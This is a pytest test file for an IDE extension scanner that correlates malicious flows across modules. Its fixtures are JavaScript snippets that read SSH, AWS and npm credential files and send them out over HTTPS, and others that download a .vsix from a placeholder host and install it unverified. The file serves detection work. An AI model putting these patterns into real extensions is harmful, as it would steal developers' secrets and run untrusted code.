import pytest

from ide_scanner.module_flow import (
    FlowAnalysisLimitError,
    credential_exfiltration_flow,
    module_flow_coverage,
    module_summary,
    remote_vsix_install_flow,
)


def test_import_connected_remote_vsix_flow_is_correlated():
    modules = [
        module_summary("extension.js", "const u=require('./updater'); u.run();"),
        module_summary("updater.js", "const d=require('./download'); fetch('https://x/update.vsix'); d.save();"),
        module_summary("download.js", "const fs=require('fs'); fs.createWriteStream('/tmp/u.vsix'); workbench.extensions.installExtension('/tmp/u.vsix');"),
    ]
    flow = remote_vsix_install_flow(modules)
    assert flow is not None
    assert flow["stages"]["download"] == ["updater.js"]
    assert flow["stages"]["install"] == ["download.js"]


def test_unconnected_cooccurrence_is_not_correlated():
    modules = [
        module_summary("network.js", "fetch('https://x/update.vsix')"),
        module_summary("unrelated.js", "fs.createWriteStream('/tmp/u.vsix'); workbench.extensions.installExtension('/tmp/u.vsix');"),
    ]
    assert remote_vsix_install_flow(modules) is None


def test_connected_integrity_check_suppresses_unverified_chain():
    modules = [
        module_summary("extension.js", "require('./update')"),
        module_summary("update.js", "fetch('https://x/u.vsix'); fs.writeFile('/tmp/u.vsix'); const actual=crypto.createHash('sha256').update(data).digest('hex'); if(actual === expectedHash) workbench.extensions.installExtension('/tmp/u.vsix');"),
    ]
    assert remote_vsix_install_flow(modules) is None


def test_sibling_modules_are_not_misrepresented_as_a_flow():
    modules = [
        module_summary("extension.js", "require('./network'); require('./installer');"),
        module_summary("network.js", "fetch('https://x/u.vsix')"),
        module_summary("installer.js", "fs.writeFile('/tmp/u.vsix', data); workbench.extensions.installExtension('/tmp/u.vsix')"),
    ]
    assert remote_vsix_install_flow(modules) is None


def test_side_effect_and_dynamic_imports_are_resolved_in_directed_path():
    modules = [
        module_summary("network.js", "fetch('https://x/u.vsix'); import('./writer')"),
        module_summary("writer.js", "fs.writeFile('/tmp/u.vsix', data); import './installer.js';"),
        module_summary("installer.js", "workbench.extensions.installExtension('/tmp/u.vsix')"),
    ]
    flow = remote_vsix_install_flow(modules)
    assert flow is not None
    assert flow["import_path"] == ["network.js", "writer.js", "installer.js"]


def test_stray_hash_creation_does_not_suppress_unverified_chain():
    modules = [
        module_summary("network.js", "fetch('https://x/u.vsix'); require('./installer')"),
        module_summary("installer.js", "crypto.createHash('sha256'); fs.writeFile('/tmp/u.vsix', data); workbench.extensions.installExtension('/tmp/u.vsix')"),
    ]
    assert remote_vsix_install_flow(modules) is not None


def test_directed_cross_file_credential_exfiltration_is_correlated():
    modules = [
        module_summary("collector.js", "const fs=require('fs'); fs.readFileSync(home+'/.ssh/id_ed25519'); fs.readFileSync(home+'/.aws/credentials'); fs.readFileSync(home+'/.npmrc'); require('./encode')"),
        module_summary("encode.js", "const body=JSON.stringify(collected); require('./send')"),
        module_summary("send.js", "const req=https.request(options); req.write(body)"),
    ]
    flow = credential_exfiltration_flow(modules)
    assert flow is not None
    assert flow["import_path"] == ["collector.js", "encode.js", "send.js"]
    assert flow["credential_families"] == ["cloud", "npm", "ssh"]


def test_single_credential_family_is_not_systematic_harvesting():
    modules = [
        module_summary("client.js", "fs.readFileSync(home+'/.npmrc'); require('./send')"),
        module_summary("send.js", "req.write(JSON.stringify(config))"),
    ]
    assert credential_exfiltration_flow(modules) is None


def test_credential_and_network_siblings_are_not_correlated():
    modules = [
        module_summary("extension.js", "require('./collector'); require('./send')"),
        module_summary("collector.js", "fs.readFileSync(home+'/.ssh/id_ed25519'); fs.readFileSync(home+'/.aws/credentials'); fs.readFileSync(home+'/.npmrc')"),
        module_summary("send.js", "req.write(JSON.stringify(data))"),
    ]
    assert credential_exfiltration_flow(modules) is None


def test_unreachable_remote_installer_is_not_correlated():
    modules = [
        module_summary("extension.js", "exports.activate=()=>{}"),
        module_summary("dead.js", "fetch('https://x/u.vsix'); require('./installer')"),
        module_summary("installer.js", "fs.writeFile('/tmp/u.vsix', data); workbench.extensions.installExtension('/tmp/u.vsix')"),
    ]
    assert remote_vsix_install_flow(modules, {"extension.js"}) is None


def test_reachable_remote_installer_is_correlated_from_entrypoint():
    modules = [
        module_summary("extension.js", "require('./network')"),
        module_summary("network.js", "fetch('https://x/u.vsix'); require('./installer')"),
        module_summary("installer.js", "fs.writeFile('/tmp/u.vsix', data); workbench.extensions.installExtension('/tmp/u.vsix')"),
    ]
    assert remote_vsix_install_flow(modules, {"extension.js"}) is not None


def test_reverse_stage_order_is_not_a_flow():
    modules = [
        module_summary("network.js", "fetch('https://x/u.vsix'); require('./installer')"),
        module_summary("installer.js", "workbench.extensions.installExtension('/tmp/u.vsix'); require('./writer')"),
        module_summary("writer.js", "fs.writeFile('/tmp/u.vsix', data)"),
    ]
    assert remote_vsix_install_flow(modules) is None


def test_network_before_serialization_is_not_credential_exfiltration():
    modules = [
        module_summary("collector.js", "fs.readFileSync('.ssh/id_ed25519');fs.readFileSync('.aws/credentials');fs.readFileSync('.npmrc');require('./send')"),
        module_summary("send.js", "req.write(data);require('./encode')"),
        module_summary("encode.js", "JSON.stringify(data)"),
    ]
    assert credential_exfiltration_flow(modules) is None


def test_module_budget_fails_closed_instead_of_returning_no_finding(monkeypatch):
    monkeypatch.setattr("ide_scanner.module_flow.MAX_FLOW_MODULES", 1)
    modules = [module_summary("a.js", ""), module_summary("b.js", "")]
    with pytest.raises(FlowAnalysisLimitError, match="module count"):
        credential_exfiltration_flow(modules)


def test_path_budget_fails_closed_instead_of_truncating(monkeypatch):
    monkeypatch.setattr("ide_scanner.module_flow.MAX_FLOW_PATHS", 1)
    modules = [
        module_summary("a.js", "fetch('https://x'); require('./b')"),
        module_summary("b.js", "require('./c')"),
        module_summary("c.js", ""),
    ]
    with pytest.raises(FlowAnalysisLimitError, match="path exploration"):
        remote_vsix_install_flow(modules)


def test_import_depth_budget_fails_closed_instead_of_truncating(monkeypatch):
    monkeypatch.setattr("ide_scanner.module_flow.MAX_FLOW_DEPTH", 2)
    modules = [
        module_summary("a.js", "fetch('https://x'); require('./b')"),
        module_summary("b.js", "require('./c')"),
        module_summary("c.js", "fs.writeFile('/tmp/u.vsix', data); workbench.extensions.installExtension('/tmp/u.vsix')"),
    ]
    with pytest.raises(FlowAnalysisLimitError, match="import depth"):
        remote_vsix_install_flow(modules)


def test_coverage_reports_unresolved_reachable_executable_import():
    modules = [module_summary("extension.js", "require('./missing-helper')")]
    coverage = module_flow_coverage(modules, {"extension.js"})
    assert coverage["reachable_modules"] == 1
    assert coverage["unresolved_executable_import_count"] == 1
    assert coverage["unresolved_executable_imports"] == [
        {"source": "extension.js", "target": "missing-helper"}
    ]


def test_coverage_ignores_unresolved_non_executable_asset_import():
    modules = [module_summary("extension.js", "require('./package.json')")]
    coverage = module_flow_coverage(modules, {"extension.js"})
    assert coverage["unresolved_executable_import_count"] == 0


def test_generated_bundle_keeps_capabilities_without_false_import_edges():
    module = module_summary(
        "dist/extension.js",
        "fetch('https://example.test'); require('../shared/logger')",
        analyze_imports=False,
    )

    assert module["download"] is True
    assert module["imports"] == []
    coverage = module_flow_coverage([module], {"dist/extension.js"})
    assert coverage["unresolved_executable_import_count"] == 0
